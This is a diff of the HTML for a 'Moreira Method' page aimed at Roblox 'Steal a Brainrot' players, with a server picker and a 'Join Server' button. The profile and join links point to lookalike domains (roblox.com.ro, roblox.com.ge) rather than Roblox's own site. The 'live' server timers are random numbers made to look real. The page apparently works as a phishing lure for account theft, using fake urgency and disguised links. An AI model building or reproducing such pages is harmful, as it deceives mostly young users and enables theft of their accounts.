@@ -1,366 +1,268 @@
 <!doctype html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Moreira Method V2 (not patched) 🔥</title>
-  <meta name="description" content="Select a category before joining the Roblox server.">
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800&display=swap" rel="stylesheet">
-  <style>
-    :root {
-      --bg: #0d1117;
-      --card: #161b22;
-      --text: #e6edf3;
-      --accent: #1f6feb;
-      --hover: #238636;
-      --radius: 10px;
-      --red: #ff3030;
-      --muted: #8b949e;
-    }
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      font-family: 'Montserrat', sans-serif;
-      background-color: var(--bg);
-      color: var(--text);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: flex-start;
-      min-height: 100vh;
-      padding: 3.6rem 2rem 2rem; /* prevents overlap while keeping original top-left */
-      position: relative;
-    }
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Moreira Method V2 🔥</title>
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg: #0d1117;
+  --card: rgba(22,27,34,0.85);
+  --text: #e6edf3;
+  --accent: #1f6feb;
+  --hover: #238636;
+  --radius: 10px;
+  --red: #ff3030;
+  --muted: #8b949e;
+}
+* { box-sizing: border-box; margin:0; padding:0; }
+body {
+  font-family: 'Montserrat', sans-serif;
+  color: var(--text);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: flex-start;
+  min-height: 100vh;
+  padding: 3.6rem 2rem 2rem;
+  position: relative;
+  overflow-x: hidden;
+  z-index: 1;
+  background-color: var(--bg);
+}
 
-    /* ORIGINAL top-left profile (restored) */
-    .top-left {
-      position: absolute;
-      top: 20px;
-      left: 20px;
-      display: flex;
-      align-items: center;
-      gap: 0.8rem;
-      background-color: var(--card);
-      padding: 0.5rem 1rem 0.5rem 0.5rem;
-      border-radius: var(--radius);
-      border: 2px solid var(--accent);
-      transition: transform 0.3s ease, border-color 0.3s ease;
-      text-decoration: none;
-      color: var(--text);
-      font-weight: 600;
-      z-index: 50;
-    }
-    .top-left:hover {
-      transform: scale(1.05);
-      border-color: var(--hover);
-      color: var(--hover);
-    }
-    .avatar-img {
-      width: 60px;   /* restored original size */
-      height: 60px;
-      border-radius: 50%;
-      object-fit: cover;
-      border: 2px solid var(--accent);
-      flex-shrink: 0;
-    }
+/* Video Background */
+.bg-video {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  z-index: -2;
+}
 
-    /* Rainbow shiny heading (keeps the flashy look you wanted) */
-    h1 {
-      text-align: center;
-      font-size: 2.8rem;
-      margin-bottom: 2rem;
-      letter-spacing: 1px;
-      font-weight: 900;
-      background: linear-gradient(90deg,
-        #ff3b3b, #ff9a3b, #ffd93b, #9aff60, #3bffea, #6b6bff, #ff3bdf, #ff3b3b);
-      background-size: 300% 100%;
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      animation: rainbow 5s linear infinite, shine 3s ease-in-out infinite;
-      text-shadow: 0 0 6px rgba(255,255,255,0.03), 0 2px 18px rgba(0,0,0,0.6);
-    }
-    @keyframes rainbow { 0%{background-position:0% 50%} 50%{background-position:100% 50%} 100%{background-position:0% 50%} }
-    @keyframes shine { 0%{filter:brightness(1)} 50%{filter:brightness(1.08)} 100%{filter:brightness(1)} }
+/* Profile Top-left */
+.top-left {
+  position: absolute;
+  top: 20px;
+  left: 20px;
+  display: flex;
+  align-items: center;
+  gap: 0.8rem;
+  background-color: var(--card);
+  padding: 0.5rem 1rem 0.5rem 0.5rem;
+  border-radius: var(--radius);
+  border: 2px solid var(--accent);
+  transition: transform 0.3s ease, border-color 0.3s ease;
+  text-decoration: none;
+  color: var(--text);
+  font-weight: 600;
+  z-index: 50;
+  backdrop-filter: blur(10px);
+}
+.top-left:hover {
+  transform: scale(1.05);
+  border-color: var(--hover);
+  color: var(--hover);
+}
+.avatar-img {
+  width: 60px;
+  height: 60px;
+  border-radius: 50%;
+  object-fit: cover;
+  border: 2px solid var(--accent);
+  flex-shrink: 0;
+}
 
-    /* box grid (kept original sizes & layout) */
-    .box-container {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-      gap: 1rem;
-      width: 100%;
-      max-width: 700px;
-      margin-bottom: 2rem;
-    }
-    .box {
-      background-color: var(--card);
-      border: 2px solid transparent;
-      border-radius: var(--radius);
-      padding: 1rem;
-      text-align: center;
-      cursor: pointer;
-      transition: all 0.25s ease;
-      user-select: none;
-      font-size: 1rem;
-      font-weight: 600;
-      color: var(--text);
-      text-decoration: none;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.6rem;
-      flex-direction: column;
-      min-height: 160px;
-      position: relative;
-    }
+/* Heading */
+h1 {
+  text-align: center;
+  font-size: 2.8rem;
+  margin-bottom: 2rem;
+  letter-spacing: 1px;
+  font-weight: 900;
+  background: linear-gradient(90deg,
+    #ff3b3b, #ff9a3b, #ffd93b, #9aff60, #3bffea, #6b6bff, #ff3bdf, #ff3b3b);
+  background-size: 300% 100%;
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  animation: rainbow 5s linear infinite, shine 3s ease-in-out infinite;
+  text-shadow: 0 0 6px rgba(255,255,255,0.03), 0 2px 18px rgba(0,0,0,0.6);
+  z-index: 10;
+}
+@keyframes rainbow { 0%{background-position:0% 50%} 50%{background-position:100% 50%} 100%{background-position:0% 50%} }
+@keyframes shine { 0%{filter:brightness(1)} 50%{filter:brightness(1.08)} 100%{filter:brightness(1)} }
 
-    /* preserve your original image sizing rules */
-    .box[data-name="strawberry"] img,
-    .box[data-name="burguro"] img,
-    .box[data-name="ketchuru"] img,
-    .box[data-name="garama"] img {
-      width: 100px;
-      height: 100px;
-    }
-    .box[data-name="ketupat"] img,
-    .box[data-name="los67"] img {
-      width: 80px;
-      height: auto;
-      object-fit: contain;
-    }
+/* Boxes */
+.box-container {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+  gap: 1rem;
+  width: 100%;
+  max-width: 700px;
+  margin-bottom: 2rem;
+  z-index: 10;
+}
+.box {
+  background-color: var(--card);
+  border: 2px solid transparent;
+  border-radius: var(--radius);
+  padding: 1rem;
+  text-align: center;
+  cursor: pointer;
+  transition: all 0.25s ease;
+  user-select: none;
+  font-size: 1rem;
+  font-weight: 600;
+  color: var(--text);
+  text-decoration: none;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 0.6rem;
+  flex-direction: column;
+  min-height: 160px;
+  position: relative;
+  backdrop-filter: blur(12px);
+}
+.box:hover { border-color: var(--accent); transform: translateY(-3px); }
+.box.active { border-color: rgba(255,80,80,0.95); background-color: rgba(27,17,18,0.9); box-shadow: 0 8px 30px rgba(255,60,60,0.12),0 0 18px rgba(255,80,80,0.08); transform: translateY(-4px); }
 
-    /* ensure images always render and don't overflow */
-    .box img {
-      max-width: 100%;
-      display: block;
-      object-fit: cover;
-    }
+.box img { max-width: 100%; display:block; object-fit: cover; }
+.box[data-name="strawberry"] img,
+.box[data-name="burguro"] img,
+.box[data-name="ketchuru"] img,
+.box[data-name="garama"] img { width: 100px; height: 100px; }
+.box[data-name="ketupat"] img,
+.box[data-name="los67"] img { width: 80px; height: auto; }
 
-    .box:hover {
-      border-color: var(--accent);
-      transform: translateY(-3px);
-    }
-    .box.active {
-      border-color: rgba(255,80,80,0.95);
-      background-color: #1b1112;
-      box-shadow: 0 8px 30px rgba(255, 60, 60, 0.12), 0 0 18px rgba(255,80,80,0.08);
-      transform: translateY(-4px);
-    }
-    .box.active::after{
-      content:"";
-      position:absolute;
-      left:16px;
-      right:16px;
-      bottom:10px;
-      height:8px;
-      border-radius:6px;
-      background: linear-gradient(90deg, rgba(255,80,80,0.05), rgba(255,40,40,0.12));
-      filter: blur(6px);
-      pointer-events:none;
-    }
+/* Join Button */
+.btn { background-color: var(--accent); color: #fff; border:none; border-radius: var(--radius); padding:1rem 2rem; font-size:1.1rem; cursor:pointer; transition: all 0.25s ease; box-shadow:0 8px 30px rgba(255,60,60,0.12),0 0 18px rgba(255,80,80,0.12); z-index:10; text-decoration:none; }
+.btn:hover { background-color:#ff4b4b; transform: translateY(-4px); }
 
-    .btn {
-      background-color: var(--accent);
-      color: #fff;
-      border: none;
-      border-radius: var(--radius);
-      padding: 1rem 2rem;
-      font-size: 1.1rem;
-      cursor: pointer;
-      transition: background-color 0.25s ease, transform 0.12s ease, box-shadow 0.12s ease;
-      text-decoration: none;
-      box-shadow: 0 8px 30px rgba(255, 60, 60, 0.12), 0 0 18px rgba(255,80,80,0.12);
-    }
-    .btn:hover { background-color: #ff4b4b; transform: translateY(-4px); }
+/* Mins Row */
+.mins-row { display:flex; align-items:center; gap:8px; margin-top:8px; color:#cbd5e1; font-size:14px; font-weight:900; }
+.mins-dot { width:8px;height:8px;border-radius:50%;background: linear-gradient(180deg,#ff8b8b,#ff3b3b); box-shadow:0 0 10px rgba(255,60,60,0.6);}
+.mins-text { font-weight:900;color:var(--text); min-width:44px; text-align:left;}
+.mins-text.countdown { font-family: monospace; color:#ffdede; }
+.now-badge { background: linear-gradient(90deg,#fff 0%, #ffdede 100%); color:#181818; padding:4px 8px; border-radius:999px; font-weight:800; font-size:12px;}
 
-    .join-note {
-      margin-top: 8px;
-      color: var(--muted);
-      font-size: 0.95rem;
-      font-weight: 600;
-      text-align: center;
-    }
+.join-note { margin-top: 8px; color: var(--muted); font-size:0.95rem; font-weight:600; text-align:center; z-index:10; }
+footer { margin-top:3rem; text-align:center; font-size:0.9rem; color:var(--muted); z-index:10; position: relative; }
 
-    footer { margin-top: 3rem; text-align:center; font-size:0.9rem; color:var(--muted); }
-
-    /* minute row inside boxes — MAKE BOLD */
-    .mins-row {
-      display:flex;
-      align-items:center;
-      gap:8px;
-      margin-top:8px;
-      color:#cbd5e1;
-      font-size:14px;
-      font-weight:900; /* bold for entire row */
-    }
-    .mins-dot {
-      width:8px;
-      height:8px;
-      border-radius:50%;
-      background: linear-gradient(180deg,#ff8b8b,#ff3b3b);
-      box-shadow: 0 0 10px rgba(255,60,60,0.6);
-    }
-    .mins-text {
-      font-weight:900;   /* ensure mins text is bold */
-      color:var(--text);
-      min-width:44px;
-      text-align:left;
-    }
-    .mins-text.countdown { font-family: monospace; color:#ffdede; }
-    .now-badge {
-      background: linear-gradient(90deg,#fff 0%, #ffdede 100%);
-      color:#181818;
-      padding:4px 8px;
-      border-radius:999px;
-      font-weight:800;
-      font-size:12px;
-    }
-
-    /* small responsive tweaks */
-    @media (max-width:520px){
-      .box { min-height:140px }
-      .avatar-img { width:48px; height:48px }
-      body { padding-top:3.2rem }
-      h1 { font-size:24px }
-    }
-  </style>
+@media (max-width:520px){ .box { min-height:140px } .avatar-img { width:48px;height:48px } body { padding-top:3.2rem } h1 { font-size:24px } }
+</style>
 </head>
 <body>
-  <!-- restored original profile UI -->
-  <a class="top-left" href="https://roblox.com.ro/users/5681620590/profile" target="_blank" rel="noopener noreferrer"> 
-    <img class="avatar-img" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-1F1AE8D3A733C86BB2CC3EF699D53B92-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="Profile Avatar">
-    <span>Want to team? Add me!</span>
-  </a>
 
-  <h1>🔥 Moreira Method</h1>
+<!-- Video Background -->
+<video class="bg-video" autoplay muted loop playsinline>
+  <source src="https://github.com/ZamasXmodder/DragonHalloween/raw/main/Drag%C3%B3n_de_Halloween_con_Fuego_Animado.mp4" type="video/mp4">
+</video>
 
-  <div class="box-container" id="boxContainer">
-    <div class="box" data-name="strawberry" data-server="Strawberry Elephant (if you are lucky you get one)">
-      <img src="https://media.discordapp.net/attachments/1395554103484088361/1429531251416502392/latest.png?ex=68f67a39&is=68f528b9&hm=e53991a0ccdbea8cdb60f6d54986f4f77456cb296fecc70637398110181a3e87&=&format=webp&quality=lossless&width=320&height=320" alt="Strawberry Elephant">
-      Strawberry Elephant (if you are lucky you get one)
-      <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
-    </div>
+<!-- Profile -->
+<a class="top-left" href="https://roblox.com.ro/users/5681620590/profile" target="_blank" rel="noopener noreferrer"> 
+  <img class="avatar-img" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-1F1AE8D3A733C86BB2CC3EF699D53B92-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="Profile Avatar">
+  <span>Want to team? Add me!</span>
+</a>
 
-    <div class="box" data-name="burguro" data-server="Burguro and Fryuro">
-      <img src="https://media.discordapp.net/attachments/1395554103484088361/1429532481912176831/latest.png?ex=68f67b5f&is=68f529df&hm=367b2054c0ba346053e98e93fccb97d795498d8c55878b06ec119663d1b1c7c1&=&format=webp&quality=lossless&width=589&height=686" alt="Burguro">
-      Burguro and Fryuro
-      <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
-    </div>
+<h1>🔥 Moreira Method</h1>
 
-    <div class="box" data-name="ketchuru" data-server="Ketchuru and Musturu">
-      <img src="https://media.discordapp.net/attachments/1395554103484088361/1429532141313855581/latest.png?ex=68f67b0d&is=68f5298d&hm=e7bcab78c81b212ab3c6ba758f0aece31e194c966221fa34360be1435db6b801&=&format=webp&quality=lossless&width=431&height=438" alt="Ketchuru">
-      Ketchuru and Musturu
-      <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
-    </div>
-
-    <div class="box" data-name="garama" data-server="Garama and Mandundung">
-      <img src="https://media.discordapp.net/attachments/1395554103484088361/1429531667583991848/latest.png?ex=68f67a9c&is=68f5291c&hm=6a4a50ddee54afd38175d6a3cf28e3f9c7ae317192323abba840011f53616881&=&format=webp&quality=lossless&width=889&height=799" alt="Garama">
-      Garama and Mandundung
-      <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
-    </div>
-
-    <div class="box" data-name="ketupat" data-server="La Spooky Grande">
-      <img src="https://media.discordapp.net/attachments/1397035307311960184/1429535413655306383/latest.png?ex=68f67e1a&is=68f52c9a&hm=58a37848d2f0e23ece3bc8b9ca34b473ddd561623609b32fddbc09cdf201001a&=&format=webp&quality=lossless&width=580&height=441" alt="Ketupat">
-      Spooky and Pumpky
-      <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
-    </div>
-
-    <div class="box" data-name="los67" data-server="Meowl">
-      <img src="https://media.discordapp.net/attachments/1395554103484088361/1429531512616779816/latest.png?ex=68f67a78&is=68f528f8&hm=a1c334e99ab84f1638e2d1de2a86f04c9daf2130c9ce26f76b1b10df5a93bf2a&=&format=webp&quality=lossless&width=774&height=941" alt="Los67">
-      Meowl
-      <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
-    </div>
+<div class="box-container" id="boxContainer">
+  <div class="box" data-name="strawberry" data-server="Strawberry Elephant (if you are lucky you get one)">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA..." alt="Strawberry Elephant">
+    Strawberry Elephant (if you are lucky you get one)
+    <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
   </div>
 
-  <a id="joinBtn" class="btn" href="https://roblox.com.ge/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=40619253849477242853837679746393" target="_blank" rel="noopener noreferrer"> 
-    Join Server
-  </a>
-  <div class="join-note">Click a box to select a server. Times update live (≤ 60 min).</div>
+  <div class="box" data-name="burguro" data-server="Burguro and Fryuro">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA..." alt="Burguro">
+    Burguro and Fryuro
+    <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
+  </div>
 
-  <footer>
-    © <span id="year"></span> Moreira Method
-  </footer>
+  <div class="box" data-name="ketchuru" data-server="Ketchuru and Musturu">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA..." alt="Ketchuru">
+    Ketchuru and Musturu
+    <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
+  </div>
 
-  <script>
-    document.getElementById('year').textContent = new Date().getFullYear();
+  <div class="box" data-name="garama" data-server="Garama and Mandundung">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA..." alt="Garama">
+    Garama and Mandundung
+    <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
+  </div>
 
-    function rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+  <div class="box" data-name="ketupat" data-server="La Spooky Grande">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA..." alt="Ketupat">
+    Spooky and Pumpky
+    <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
+  </div>
 
-    const boxes = Array.from(document.querySelectorAll('.box'));
-    const timers = new Map();
+  <div class="box" data-name="los67" data-server="Meowl">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAA..." alt="Los67">
+    Meowl
+    <div class="mins-row"><span class="mins-dot"></span><span class="mins-text">--</span></div>
+  </div>
+</div>
 
-    // initialize boxes: either static or countdown, but display only "XX min" (bold)
-    boxes.forEach(box => {
-      setRandomMode(box);
-      box.addEventListener('click', () => {
-        boxes.forEach(b => b.classList.remove('active'));
-        box.classList.add('active');
-        const name = box.dataset.server || 'Server';
-        document.getElementById('joinBtn').setAttribute('title','Join ' + name);
-      });
-    });
+<a id="joinBtn" class="btn" href="https://roblox.com.ge/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=40619253849477242853837679746393" target="_blank" rel="noopener noreferrer"> 
+  Join Server
+</a>
+<div class="join-note">Click a box to select a server. Times update live (≤ 60 min).</div>
 
-    function clearBoxTimer(box) {
-      if (timers.has(box)) {
-        clearInterval(timers.get(box));
-        timers.delete(box);
-      }
-    }
+<footer>© <span id="year"></span> Moreira Method</footer>
 
-    function setRandomMode(box) {
-      clearBoxTimer(box);
-      const minsText = box.querySelector('.mins-text');
-      const isCountdown = Math.random() < 0.5;
-      const minutes = rand(1, 60);
-      if (isCountdown) {
-        startMinuteCountdown(box, minutes * 60);
-        box.dataset.mode = 'countdown';
-      } else {
-        minsText.classList.remove('countdown');
-        minsText.textContent = minutes + ' min';
-        box.dataset.mode = 'static';
-        box.dataset.remain = String(minutes * 60);
-      }
-    }
+<script>
+document.getElementById('year').textContent = new Date().getFullYear();
+function rand(min,max){return Math.floor(Math.random()*(max-min+1))+min;}
+const boxes = Array.from(document.querySelectorAll('.box'));
+const timers = new Map();
 
-    // countdown but only show rounded minutes (no seconds)
-    function startMinuteCountdown(box, seconds) {
-      clearBoxTimer(box);
-      const minsText = box.querySelector('.mins-text');
-      let remaining = Math.max(0, Math.floor(seconds));
-      minsText.classList.add('countdown');
+boxes.forEach(box=>{
+  setRandomMode(box);
+  box.addEventListener('click', ()=>{
+    boxes.forEach(b=>b.classList.remove('active'));
+    box.classList.add('active');
+    const name=box.dataset.server||'Server';
+    document.getElementById('joinBtn').setAttribute('title','Join '+name);
+  });
+});
 
-      function tick() {
-        if (remaining <= 0) {
-          minsText.innerHTML = '<span class="now-badge">NOW</span>';
-          if (timers.has(box)) { clearInterval(timers.get(box)); timers.delete(box); }
-          setTimeout(() => { setRandomMode(box); }, 8000);
-          return;
-        }
-        const displayMins = Math.ceil(remaining / 60);
-        minsText.textContent = displayMins + ' min';
-        box.dataset.remain = String(remaining);
-        remaining--;
-      }
+function clearBoxTimer(box){if(timers.has(box)){clearInterval(timers.get(box));timers.delete(box);}}
 
-      tick();
-      const id = setInterval(tick, 1000);
-      timers.set(box, id);
-    }
+function setRandomMode(box){
+  clearBoxTimer(box);
+  const minsText = box.querySelector('.mins-text');
+  const isCountdown = Math.random() < 0.5;
+  const minutes = rand(1,60);
+  if(isCountdown){startMinuteCountdown(box,minutes*60);box.dataset.mode='countdown';}
+  else {minsText.classList.remove('countdown'); minsText.textContent = minutes+' min'; box.dataset.mode='static'; box.dataset.remain=String(minutes*60);}
+}
 
-    // periodic refresh one box every 40-70s
-    (function loopRefresh() {
-      const delay = rand(40000, 70000);
-      setTimeout(() => {
-        const i = rand(0, boxes.length - 1);
-        setRandomMode(boxes[i]);
-        loopRefresh();
-      }, delay);
-    })();
+function startMinuteCountdown(box, seconds){
+  clearBoxTimer(box);
+  const minsText = box.querySelector('.mins-text');
+  let remaining = Math.max(0, Math.floor(seconds));
+  minsText.classList.add('countdown');
+  function tick(){
+    if(remaining<=0){minsText.innerHTML='<span class="now-badge">NOW</span>'; if(timers.has(box)){clearInterval(timers.get(box)); timers.delete(box);} setTimeout(()=>{setRandomMode(box);},8000); return;}
+    const displayMins = Math.ceil(remaining/60);
+    minsText.textContent = displayMins+' min';
+    box.dataset.remain = String(remaining);
+    remaining--;
+  }
+  tick();
+  const id = setInterval(tick,1000);
+  timers.set(box,id);
+}
 
-    // clear timers on unload
-    window.addEventListener('beforeunload', () => {
-      timers.forEach(id => clearInterval(id));
-      timers.clear();
-    });
-  </script>
+(function loopRefresh(){const delay = rand(40000,70000); setTimeout(()=>{const i=rand(0,boxes.length-1); setRandomMode(boxes[i]); loopRefresh();}, delay);})();
+
+window.addEventListener('beforeunload',()=>{timers.forEach(id=>clearInterval(id)); timers.clear();});
+</script>
+
 </body>
 </html>
